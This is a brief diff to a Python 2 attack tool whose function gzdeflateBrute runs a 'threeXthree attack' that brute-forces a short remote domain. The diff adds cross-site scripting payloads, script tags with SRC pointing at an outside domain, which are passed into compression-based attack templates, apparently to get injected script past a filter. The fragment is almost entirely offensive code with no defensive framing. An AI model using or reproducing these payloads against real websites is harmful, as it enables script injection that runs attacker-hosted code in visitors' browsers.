@@ -37,6 +37,7 @@ def gzdeflateBrute(remoteDomain, prefix, tld):
 		print "[+] Using threeXthree attack..."
 		print "[+] Attempting to bruteforce tld first"
 		#attack tld first using PPP domain as a crutch
+		targetPayload = "<SCRIPT SRC=//PPP.%s></SCRIPT" %tld
 		tldTemplate = tldAttackTemplateTable["threeXthree"][0]
 		start = tldAttackTemplateTable["threeXthree"][1]
 		end = tldAttackTemplateTable["threeXthree"][2]
@@ -54,6 +55,7 @@ def gzdeflateBrute(remoteDomain, prefix, tld):
 				
 
 		#attack domain using discovered tld as crutch
+		targetPayload = "<SCRIPT SRC=//%s.%s></SCRIPT" % (prefix, construct)
 		start = domainAttackTemplateTable["threeXthree"][1]
 		end = domainAttackTemplateTable["threeXthree"][2]
 		payload = attackTemplate(domainTemplate, start, end, targetPayload)
